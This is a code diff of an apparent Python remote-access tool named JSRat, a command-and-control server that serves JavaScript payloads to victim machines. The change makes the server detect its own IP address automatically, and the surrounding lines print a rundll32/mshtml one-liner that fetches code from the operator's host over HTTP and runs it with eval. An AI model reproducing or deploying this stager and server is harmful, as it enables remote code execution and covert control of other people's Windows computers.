@@ -144,21 +144,27 @@ class Server(threading.Thread):
 
 
 class JSRat(object):
-    def __init__(self, host, port, shell):
+    def __init__(self):
         super().__init__()
-        self.httpd = Server(host, port, shell)
-        self.host = host
-        self.port = port
-        self.shell = shell
-        self.__setup()
-    
-    def __setup(self):
+        self.port = 8080 
+        self.shell = Shell()
+        self.httpd = Server(self.__host, self.port, self.shell)
         self.httpd.start()
+
+    @property
+    def __host(self):
+        import socket
+        host = b''
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(('8.8.8.8', 80))
+            host = s.getsockname()[0]
+        return host 
+
     def __parse_line(self, line):
         return line.strip().partition(' ')
 
     def cli_start(self,*args, **kwargs):
-        self.print_online_cmd(self.host, self.port)
+        self.print_online_cmd(self.__host, self.port)
         while True:
             command, _, args = self.__parse_line(input(self.shell.prompt))
             if not command:
@@ -183,10 +189,7 @@ class JSRat(object):
         print('[4]', r'''{} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'''.format('rundll32', host, port))
 
 def main():
-    host = '192.168.1.4'
-    port = 8080
-    shell = Shell()
-    jsrat = JSRat(host, port, shell)
+    jsrat = JSRat()
     jsrat.cli_start()
 
 if __name__ == '__main__':
